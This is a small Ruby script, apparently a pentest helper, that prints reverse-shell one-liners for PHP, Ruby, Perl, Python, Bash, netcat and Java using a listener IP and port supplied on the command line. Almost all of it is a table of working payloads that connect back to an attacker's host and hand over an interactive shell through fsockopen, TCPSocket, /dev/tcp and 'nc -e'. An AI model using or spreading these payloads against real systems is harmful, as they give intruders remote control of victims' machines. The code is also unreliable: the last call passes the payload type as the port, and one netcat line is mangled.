#!/usr/bin/env ruby
=begin
coded by @mdp4rv3z
=end
def payload(type,ip,port)
	oneline={
		"php" => ["php -r '$sock=fsockopen(\"#{ip}\",#{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
		
		"ruby" => ["ruby -rsocket -e'f=TCPSocket.open(\"#{ip}\",#{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
			"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{ip}\",\"#{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
			],
		
		"perl" => ["perl -e 'use Socket;$i=\"#{ip}\";$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));
		if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",

		"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"#{ip}:#{port}\");STDIN->fdopen($c,r);
		$~->fdopen($c,w);system$_ while<>;'"],

		"python" => ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0);
	os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"],

	"bash" => ["bash -i >& /dev/tcp/#{ip}/#{port} 0>&1","0<&196;exec 196<>/dev/tcp/#{ip}/#{port}; sh <&196 >&196 2>&196 ",
		"exec 5<>/dev/tcp/#{ip}/#{port} cat <&5 | while read line; do $line 2>&5 >&5; done  # or: while read line 0<&5; do $line 2>&5 >&5; done"
	],

	"netcat" => ["nc -e /bin/sh #{ip} #{port}","rm -f /tmp/p; mknod /tmp/p p && nc #{ip} #{port} 0/tmp/p"],

	"java" => ["r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/#{ip}/#{port};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
p.waitFor()"]


	}

	x=oneline.select{|k,v| type==k}

	x.each_value{|x| x.each{|y|  puts "\n\033[93m#{y}\e[0m\n\n"}}


end




type = ["php","perl","ruby","bash","netcat","java","python"]

if ARGV.empty?
 	puts "\033[92mUSAGE: #{__FILE__} <type> <lhost> <lport>  | #{__FILE__} help --> for showing help\e[0m"
	
elsif (ARGV[1].nil?&&ARGV[2].nil?) && ARGV[0] == "help"
				puts "\033[34mAvailable:\e[0m"
				type.each{|x| print "\033[96m-#{x}-\e[0m"}
				puts " "
else
			payload(ARGV[0],ARGV[1],ARGV[0])
end
